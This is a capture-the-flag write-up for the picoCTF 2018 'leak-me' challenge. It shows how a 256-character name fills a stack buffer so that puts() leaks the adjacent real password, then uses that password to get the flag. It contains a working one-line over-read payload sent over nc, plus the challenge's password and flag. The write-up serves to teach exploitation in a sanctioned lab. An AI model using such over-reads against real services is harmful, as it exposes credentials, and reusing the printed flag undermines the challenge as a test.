# leak-me (pwn, 200pts)

> Can you authenticate to this service and get the flag? Connect with nc 2018shell.picoctf.com 23685. Source.

Running [`file`](https://linux.die.net/man/1/file), we see this is a 32-bit ELF binary:

```sh
$ file auth
auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux
2.6.32, BuildID[sha1]=43b5daa6b94ef81ac231729a8852d3ff26d8f60c, not stripped
```

Mark the binary as executable and run it (you'll need to create `password.txt` and `flag.txt` files):

```sh
$ echo "thisisapassword" > password.txt
$ echo "picoCTF{flag}" > flag.txt
$ ./auth
What is your name?
test
Hello test,
Please Enter the Password.
thisisapassword
picoCTF{flag}
```

From this output we see that:

* We're asked for two inputs - a name and a password
* If we enter the correct password, the flag is printed 

Taking a look at the source code, we see three char arrays are defined:

```c
  char password[64];        // the real password
  char name[256];           // the name we input
  char password_input[64];  // the password we input
```

When the program reads our name, if there's a new line, it changes it to a null byte to indicate the end of the string.
The text `\nPlease Enter the Password.` is then appended to our name. Both of these points are interesting:

* If we enter exactly 256 characters, reading `name` as a string won't encounter a null byte so will continue reading
  into the `password` array, as this is directly above on the stack.
* [`strcat`](http://www.cplusplus.com/reference/cstring/strcat/) appends to the `name` array, so we could get away with
  less than 256 characters

```c
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }
  
  strcat(name, ",\nPlease Enter the Password.");
```

The real password is then read input the `password` char array and our name is printed to standard output:

```c
  file = fopen("password.txt", "r");
  if (file == NULL) {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);
```

The important part here is that the real password is read *before* our name is printed, as this is why the exploit
prints the real password.

Connect to the server and send 256 characters as your name to leak the real password, then connect again using a shorter
name and the real password to get the flag:

```
$ python2 -c "print 'A'*256" | nc 2018shell.picoctf.com 23685
What is your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,a_reAllY_s3cuRe_p4s$word_a28d9d

Incorrect Password!

$ nc 2018shell.picoctf.com 23685
What is your name?
test
Hello test,
Please Enter the Password.
a_reAllY_s3cuRe_p4s$word_a28d9d
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_ee6111c9}
```
